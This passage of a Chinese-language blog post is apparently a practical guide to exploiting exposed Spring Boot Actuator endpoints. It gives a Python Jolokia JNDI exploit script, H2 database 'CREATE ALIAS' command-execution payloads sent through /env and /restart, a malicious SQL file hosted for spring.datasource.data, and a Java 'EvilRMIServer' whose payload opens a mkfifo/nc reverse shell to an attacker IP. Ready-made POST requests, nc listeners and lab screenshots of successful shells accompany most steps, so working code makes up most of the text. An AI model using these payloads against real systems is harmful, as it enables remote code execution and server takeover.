class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入connectionURL为自己公网RMI service地址</span></span><br><span class="line">set_connectionURL = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;connectionURL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;rmi://192.168.233.249:8090/jndi&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#停止Realm</span></span><br><span class="line">stop_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;stop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#运行Realm，触发JNDI 注入</span></span><br><span class="line">start = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;start&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line">expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> expoloit:</span><br><span class="line">    rep = req.post(url, json=i)</span><br><span class="line">    pprint(rep.json())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在kali上使用python运行该脚本，指定目标ip地址和端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令:python exploit.py http://192.168.233.247:8090</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/9a08beff758b28b994d334ea398a856f.png"></p><p>该脚本运行成功后，可以看到kali的nc反弹shell成功</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/f234a703de0dd6e5042e6ee09f60fb1e.png"></p><h5 id="利用原理-4"><a href="#利用原理-4" class="headerlink" title="利用原理"></a>利用原理</h5><ul><li>创建 JNDIRealm</li><li>写入 contextFactory 为 RegistryContextFactory</li><li>写入 connectionURL 为你的 RMI Service URL</li><li>停止 Realm</li><li>启动 Realm 以触发 JNDI 注入</li></ul><p>详细分析请参见</p><p><a href="https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html">Yet Another Way to Exploit Spring Boot Actuators via Jolokia</a></p><h4 id="2-6-restart-h2-database-query-RCE"><a href="#2-6-restart-h2-database-query-RCE" class="headerlink" title="2.6.restart h2 database query RCE"></a>2.6.restart h2 database query RCE</h4><h5 id="利用条件-8"><a href="#利用条件-8" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li></ul><h5 id="利用方法-7"><a href="#利用方法-7" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：设置 spring.datasource.hikari.connection-test-query 属性</strong></p><blockquote><p>⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发</p></blockquote><p>spring 1.x（无回显执行命令）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;str1&#x27;,&#x27;str2&#x27;,&#x27;str3&#x27;);</span><br></pre></td></tr></table></figure><p><strong>str1,str2和str3这三个参数组成要执行的命令</strong></p><p>spring 2.x（无回显执行命令）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;str1&#x27;,&#x27;str2&#x27;,&#x27;str3&#x27;);&quot;&#125;</span><br></pre></td></tr></table></figure><p><strong>步骤二：重启应用</strong></p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="利用实例-5"><a href="#利用实例-5" class="headerlink" title="利用实例"></a>利用实例</h5><p>首先判断在/env变量中是否存在h2.database依赖spring.datasource.hikari.connection-test-query</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210830180327037.png" alt="image-20210830180327037"></p><p>构造Post请求/actuator/env设置依赖为需要执行的命令，这里使用的是nc反向连接自己的主机192.168.233.242的1234端口</p><p>请求数据包如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9096</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T6 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T6(&#x27;nc&#x27;,&#x27;192.168.233.242&#x27;,&#x27;1234&#x27;);&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>注:T6这个别名参数，每个参数只能使用一次，每个payload用完后要修改这个别名参数，否则不能执行</strong></p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210830180618708.png" alt="image-20210830180618708"></p><p>在自己的主机上使用nc监听1234端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure><p>构造请求/actuator/restart数据包，重启</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210830180129484.png" alt="image-20210830180129484"></p><p>重启后，可以看到目标连接成功</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210830181954887.png" alt="image-20210830181954887"></p><h5 id="利用原理-5"><a href="#利用原理-5" class="headerlink" title="利用原理"></a>利用原理</h5><ul><li>spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 <code>CREATE ALIAS</code> 创建自定义函数的 SQL 语句</li><li>其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句</li><li>restart 重启应用，会建立新的数据库连接</li><li>如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞</li></ul><p>详细分析参见下文</p><p><a href="https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database">remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database</a></p><h4 id="2-7restart-spring-datasource-data-h2-database-RCE"><a href="#2-7restart-spring-datasource-data-h2-database-RCE" class="headerlink" title="2.7restart spring.datasource.data h2 database RCE"></a>2.7restart spring.datasource.data h2 database RCE</h4><h5 id="利用条件-9"><a href="#利用条件-9" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>环境中需要存在 <code>h2database</code>、<code>spring-boot-starter-data-jpa</code> 相关依赖</li><li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li><li>⚠️ HTTP 服务器如果返回含有畸形 h2 sql 语法内容的文件，会导致程序异常退出</li></ul><h5 id="利用方法-8"><a href="#利用方法-8" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：编写sql 文件并托管</strong></p><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>在根目录放置以任意名字的文件，内容为需要执行的 h2 sql 代码，比如：</p><blockquote><p>⚠️ 下面payload 中的 ‘T5’ 方法只能 restart 执行一次；后面 restart 需要更换新的方法名称 (如 T6) 和设置新的 sql URL 地址，然后才能被 restart 重新使用，否则第二次 restart 重启应用时会导致程序异常退出</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;nc&#x27;,&#x27;ip地址&#x27;,&#x27;port&#x27;);</span><br></pre></td></tr></table></figure><p><strong>步骤二：设置 spring.datasource.data 属性</strong></p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.data=http://your-vps-ip/example.sql</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.data&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.sql&quot;&#125;</span><br></pre></td></tr></table></figure><p><strong>步骤三：重启应用</strong></p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="利用实例-6"><a href="#利用实例-6" class="headerlink" title="利用实例"></a>利用实例</h5><p>编写h2 sql语句,执行nc连接目标主机192.168.233.242的端口1234</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;nc&#x27;,&#x27;192.168.233.242&#x27;,&#x27;1234&#x27;);</span><br></pre></td></tr></table></figure><p>使用python开启http服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2  -m    SimpleHTTPServer    8080</span><br></pre></td></tr></table></figure><p>POST方式构造请求数据包对/actuator/env端点进行请求，设置spring.datasource.data为前面开启http服务的example.sql的url地址</p><p>请求报文如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9096</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.data&quot;,&quot;value&quot;:&quot;http://192.168.233.242:8080/example.sql&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210831171742647.png" alt="image-20210831171742647"></p><p>在调用/actuator/restart端点进行重启springboot项目</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210831173855310.png" alt="image-20210831173855310"></p><p>重启springboot后反弹shell成功</p><p>![image-20210830181954887](C:\Users\ZR\Desktop\springboot\Spring Boot Actuator未授权访问利用实战利用.assets\image-20210830181954887.png)</p><h5 id="利用原理-6"><a href="#利用原理-6" class="headerlink" title="利用原理"></a>利用原理</h5><ul><li>目标机器可以通过 spring.datasource.data 属性来设置 jdbc DML sql 文件的 URL 地址</li><li>restart 重启应用后，程序会请求设置的 URL 地址</li><li>spring-boot-autoconfigure<code>组件中的</code>org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java<code>文件代码逻辑中会使用</code>runScripts` 方法执行请求 URL 内容中的 h2 database sql 代码，造成 RCE 漏洞</li></ul><p>详细漏洞分析参见如下；</p><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce">repository/springboot-restart-rce</a></p><h4 id="2-8-h2-database-console-JNDI-RCE"><a href="#2-8-h2-database-console-JNDI-RCE" class="headerlink" title="2.8.h2 database console JNDI RCE"></a>2.8.h2 database console JNDI RCE</h4><h5 id="利用条件-10"><a href="#利用条件-10" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li><li>spring 配置中启用 h2 console  <code>spring.h2.console.enabled=true</code></li><li>目标可以请求攻击者的服务器（请求可出外网）</li><li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）</li></ul><h5 id="利用方法-9"><a href="#利用方法-9" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：访问路由获得 jsessionid</strong></p><p>直接访问目标开启 h2 console 的默认路由 <code>/h2-console</code>，目标会跳转到页面 <code>/h2-console/login.jsp?jsessionid=xxxxxx</code>，记录下实际的 <code>jsessionid=xxxxxx</code> 值。</p><p><strong>步骤二：准备要执行的 Java 代码</strong></p><p>编写优化过后的用来反弹 shell 的JAVA代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.registry.*;</span><br><span class="line">import com.sun.jndi.rmi.registry.*;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line">public class EvilRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port xxxxx&quot;);//RMI服务监听地址</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"> </span><br><span class="line">        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc xxx.xxx.xxx.xxx xxxx &gt;/tmp/f&#x27;]).start()\&quot;)&quot;));</span><br><span class="line">         //反弹shell地址为xxx.xxx.xxx.xxx(ip地址)，端口为xxxx(端口地址)</span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;jndi&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>步骤三：打包JAVA代码</strong></p><p>将上面反弹shell的JAVA代码进行打包成jar包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mvn clean install</span><br><span class="line">或者</span><br><span class="line">javac xxxxxxx.java</span><br><span class="line">jar -cvf  xxxx.jar -C src/ .</span><br></pre></td></tr></table></figure><p><strong>步骤四：架设恶意 RMI服务</strong></p><p>指定开启RMI服务的ip地址，使用下面命令架设对应的 RMI服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=xxx.xxx.xxx.xxx -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure><p><strong>步骤五：监听反弹 shell 的端口</strong></p><p>一般使用 nc 监听端口，等待反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 监听端口</span><br></pre></td></tr></table></figure><p><strong>步骤六：发包触发 JNDI 注入</strong></p><p>根据实际情况，替换下面数据中的 <code>jsessionid=xxxxxx</code>、<code>www.example.com</code> 和 <code>RMI://your-vps-ip:port/jndi</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /h2-console/login.do?jsessionid=xxxxxx</span><br><span class="line">Host: www.example.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxx</span><br><span class="line"></span><br><span class="line">language=en&amp;setting=Generic+H2+%28Embedded%29&amp;name=Generic+H2+%28Embedded%29&amp;driver=javax.naming.InitialContext&amp;url=rmi://your-vps-ip:port/jndi&amp;user=&amp;password=</span><br></pre></td></tr></table></figure><h5 id="利用实例-7"><a href="#利用实例-7" class="headerlink" title="利用实例"></a>利用实例</h5><p>访问目标站点的/h2-console页面，url会跳转到/h2-console/login.jsp?jsessionid=10f21eec1f912ae36cd39c55740101b5</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210830204241737.png" alt="image-20210830204241737"></p><p>这里的开启RMI服务JAVA代码如下:</p><p>反弹shell到192.168.233.242的1234端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.registry.*;</span><br><span class="line">import com.sun.jndi.rmi.registry.*;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line">public class EvilRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port 8090&quot;);//RMI服务监听地址为8090</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"> </span><br><span class="line">        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.233.242 1234 &gt;/tmp/f&#x27;]).start()\&quot;)&quot;));</span><br><span class="line">         </span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;jndi&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将该代码进行maven打包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn install</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210830204556955.png" alt="image-20210830204556955"></p><p>然后指定访问ip地址开启RMI服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=192.168.233.242 -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210830204855751.png" alt="image-20210830204855751"></p><p>使用nc监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure><p>构造Post方式请求/h2-console/login.do?session=xxxx，请求报文中指定RMI服务的ip地址和端口</p><p>请求报文如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /h2-console/login.do?jsessionid=152896463738fcc39cb0a74a0e3b5a1e HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9096</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://192.168.233.242:9096/h2-console/login.jsp?jsessionid=10f21eec1f912ae36cd39c55740101b5</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 163</span><br><span class="line"></span><br><span class="line">language=en&amp;setting=Generic+H2+%28Embedded%29&amp;name=Generic+H2+%28Embedded%29&amp;driver=javax.naming.InitialContext&amp;url=rmi://192.168.233.242:8090/jndi&amp;user=&amp;password=</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210830211055253.png" alt="image-20210830211055253"></p><p>可以看到nc连接shell成功</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210830211733059.png" alt="image-20210830211733059"></p><h5 id="利用原理-7"><a href="#利用原理-7" class="headerlink" title="利用原理"></a>利用原理</h5><ul><li>设置恶意url参数向h2-console/login.do?session=xxxx发出请求</li><li>服务器访问恶意url中的RMI服务，发生JNDI注入</li><li>RMI服务执行其他的恶意代码</li></ul><p>详细分析参见</p><p><a href="https://mp.weixin.qq.com/s/Yn5U8WHGJZbTJsxwUU3UiQ">Spring Boot + H2数据库JNDI注入</a></p><h4 id="2-9-mysql-jdbc-deserialization-RCE"><a href="#2-9-mysql-jdbc-deserialization-RCE" class="headerlink" title="2.9. mysql jdbc deserialization RCE"></a>2.9. mysql jdbc deserialization RCE</h4><blockquote><p>该环境需要安装Mysql服务和新建数据库，主要还是application.properties配置文件，注意里面的数据库相关配置(请求的数据库名，数据库账户和密码)</p></blockquote><h5 id="利用条件-11"><a href="#利用条件-11" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标环境中存在 <code>mysql-connector-java</code> 依赖</li><li>目标可以请求攻击者的服务器（请求可出外网）</li></ul><h5 id="利用方法-10"><a href="#利用方法-10" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：查看环境依赖</strong></p><p>GET 请求 <code>/env</code> 或 <code>/actuator/env</code>，搜索环境变量（classpath）中是否有 <code>mysql-connector-java</code> 